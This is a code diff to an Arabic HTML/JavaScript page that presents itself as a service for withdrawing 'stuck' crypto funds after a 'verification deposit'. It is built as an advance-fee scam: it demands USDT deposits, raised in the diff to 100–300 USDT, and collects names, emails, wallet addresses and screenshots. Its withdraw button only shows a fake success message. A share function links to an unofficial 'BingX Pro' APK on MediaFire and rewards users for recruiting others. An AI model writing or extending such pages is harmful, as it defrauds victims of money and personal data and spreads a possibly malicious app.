@@ -118,6 +118,7 @@ hr{border:none;border-top:1px solid rgba(255,255,255,0.2);margin:20px 0;}
 <div class="container">
   <div class="brand">أهلاً بكم بإيداع التحقق الخاص بسحب الأموال العالقة</div>
 
+  <!-- خانة التحقق -->
   <div class="card">
     <h3>التحقق من مبلغ الإيداع</h3>
     <label>أدخل مبلغك للتحقق من الحد الأدنى المطلوب:</label>
@@ -126,6 +127,7 @@ hr{border:none;border-top:1px solid rgba(255,255,255,0.2);margin:20px 0;}
     <p id="check-msg" class="muted" style="margin-top:6px"></p>
   </div>
 
+  <!-- خانة الإيداع -->
   <div class="card">
     <h3>إيداع التحقق</h3>
     <label>المبلغ المراد إيداعه (USDT)</label>
@@ -142,6 +144,7 @@ hr{border:none;border-top:1px solid rgba(255,255,255,0.2);margin:20px 0;}
     <p id="verify-msg" class="muted"></p>
   </div>
 
+  <!-- خانة السحب -->
   <div class="card">
     <h3>طلب سحب بعد التحقق</h3>
     <div class="alert-note">⚠️ قبل طلب السحب، يجب رفع صورة للأموال العالقة على المنصة</div>
@@ -198,10 +201,10 @@ function checkDeposit(){
   const amt = parseFloat(document.getElementById('check-amount').value);
   let msg='';
   if(isNaN(amt) || amt<=0){ msg='يرجى إدخال مبلغ صالح'; }
-  else if(amt<500){ msg='يجب الإيداع: 50 USDT'; }
-  else if(amt<1000){ msg='يجب الإيداع: 100 USDT'; }
-  else if(amt<2000){ msg='يجب الإيداع: 200 USDT'; }
-  else{ msg='يجب الإيداع: 300 USDT'; }
+  else if(amt<=500){ msg='يجب الإيداع: 100 USDT'; }
+  else if(amt<=1000){ msg='يجب الإيداع: 200 USDT'; }
+  else if(amt<=2000){ msg='يجب الإيداع: 300 USDT'; }
+  else{ msg='يرجى التواصل مع الدعم'; }
   document.getElementById('check-msg').innerText = msg;
 }
 
@@ -214,4 +217,27 @@ function submitVerificationDeposit(){
   alert(`تم إرسال طلب التحقق لمبلغ ${amount} USDT بنجاح، قيد المراجعة.`);
 }
 
-function request
+function requestWithdraw(){
+  const name = document.getElementById('user-name').value.trim();
+  const code = document.getElementById('ref-code').value.trim();
+  const email = document.getElementById('user-email').value.trim();
+  const amt = parseFloat(document.getElementById('withdraw-amount').value);
+  const wallet = document.getElementById('withdraw-target-wallet').value.trim();
+  const lockedFile = document.getElementById('locked-funds-file').files[0];
+
+  if(!name || !code || !email){ alert('يرجى ملء جميع البيانات الشخصية'); return; }
+  if(isNaN(amt) || amt<=0){ alert('أدخل مبلغ سحب صالح'); return; }
+  if(!wallet){ alert('أدخل عنوان محفظتك لاستلام السحب'); return; }
+  if(!lockedFile){ alert('يرجى رفع صورة للأموال العالقة قبل السحب'); return; }
+
+  document.getElementById('withdraw-msg').innerText = 'تم تقديم طلب سحب الأموال بنجاح';
+  alert(`تم تقديم طلب سحب الأموال بمبلغ ${amt} USDT. سيتم مراجعة طلبك.`);
+}
+
+function shareApp(){
+  window.open('https://www.mediafire.com/file/7fi3cvqggr9d2fg/BingX+Pro+V2.0.apk/file', '_blank');
+  alert('شارك رابط التطبيق مع أصدقائك. كل شخص ينضم يخصم لك 10 USDT من الإيداع.');
+}
+</script>
+</body>
+</html>
